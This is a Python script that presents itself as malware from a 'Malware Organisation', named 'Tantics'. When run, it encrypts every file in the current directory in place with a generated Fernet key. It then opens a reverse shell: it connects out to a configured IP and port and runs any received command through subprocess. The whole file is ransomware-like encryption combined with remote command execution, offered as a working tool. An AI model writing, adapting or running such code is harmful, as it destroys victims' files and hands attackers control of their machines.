import socket
from cryptography.fernet import Fernet
import os
import subprocess
from pyfiglet import figlet_format
import sys

"""
Copyright © 2024, Write-right reserved
Malware Organisation 
Written by - C.E.O
C.E.O - Sarvaang Srivastava 
"""


class Setup:

    def __init__(self, name="Tantics", version=1.0):
        self._name = name
        self.ver = version

    @property
    def name(self):
        return self._name

    @property
    def version(self):
        return self.ver

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @version.setter
    def version(self, new_ver):
        self.ver = new_ver

    def show_name(self):
        fig = figlet_format(self._name, "slant")
        ver = figlet_format(str(self.ver), "slant")
        print(f"{fig} {ver}")


class GiveAccessAndEncrypt:
    def __init__(self, ip="192.168.1.7", port=5340):
        self._ip = ip
        self._port = port
        self.BUFFER_SIZE = 1024 * 128
        self.SEPERATOR = "<sep>"
        self._sock = socket.socket()
        self.key = Fernet.generate_key()

    @property
    def ip(self):
        return self._ip

    @property
    def port(self):
        return self._port

    @ip.setter
    def ip(self, new_ip):
        self._ip = new_ip

    @port.setter
    def port(self, new_p):
        self._port = new_p

    def encrypt(self, files: list[str]):
        with open("the_key.key", "wb") as key:
            key.write(self.key)

        for file in files:
            with open(file, "rb") as file1:
                contents = file1.read()

            contents_enc = Fernet(self.key).encrypt(contents)

            with open(file, "wb") as fileTWoWay:
                fileTWoWay.write(contents_enc)

    def execute(self, command):
        return subprocess.getoutput(command)
    
    def giveaccess(self):
        self._sock.connect((self._ip, self._port))
        self.pwd = os.getcwd()
        self._sock.send(self.pwd.encode())

        while True:
            com = self._sock.recv(self.BUFFER_SIZE).decode()
            sp_co = com.split()
            if com.lower() == "exit":
                break
            if sp_co[0] == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(sp_co[1:]))
                except FileNotFoundError as e:
                # if there is an error, set as the output
                    output = str(e)
                else:
                    output = ""
            else:
                output = self.execute(com)
                formate = f"{output}{self.SEPERATOR}{self.pwd}"
                self._sock.send(formate.encode())
        self._sock.close()

try:
    files = []

    for file in os.listdir(os.curdir):
        if file == "client.py" or file == "the_key.key":
            continue
        if os.path.isfile(file):
            files.append(str(file))

    print(f"[+] {files} Found!")

    ins = GiveAccessAndEncrypt()
    ins.ip = "127.0.0.1"


    ins.encrypt(files=files)
    ins.giveaccess()

except Exception as e:
    sys.exit(1)